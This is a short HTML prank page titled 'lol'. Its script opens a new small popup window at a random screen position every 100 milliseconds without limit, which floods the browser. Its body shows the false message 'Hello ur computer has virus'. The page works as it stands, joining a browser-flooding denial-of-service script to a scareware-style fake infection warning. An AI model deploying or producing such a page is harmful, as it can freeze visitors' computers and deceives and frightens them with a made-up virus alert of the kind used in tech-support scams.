<!DOCTYPE html>
<html>
<head>
  <title>lol</title>
  <script>
    let totalPopups = 0;

    function getRandomPosition() {
      const width = 250;
      const height = 200;
      const x = Math.floor(Math.random() * (window.screen.availWidth - width));
      const y = Math.floor(Math.random() * (window.screen.availHeight - height));
      return { x, y };
    }

    function clone() {
      totalPopups++;

      const pos = getRandomPosition();
      const popup = window.open(
        "popup.html",
        "_blank",
        `width=250,height=200,left=${pos.x},top=${pos.y}`
      );

      if (!popup) return;

      const interval = setInterval(() => {
        if (popup.closed) {
          totalPopups--;
          clearInterval(interval);
        }
      }, 200);
    }

    setInterval(clone, 100);
  </script>
</head>
<body>
  <h3>Lol</h3>
  <p>Hello ur computer has virus</p>
</body>
</html>
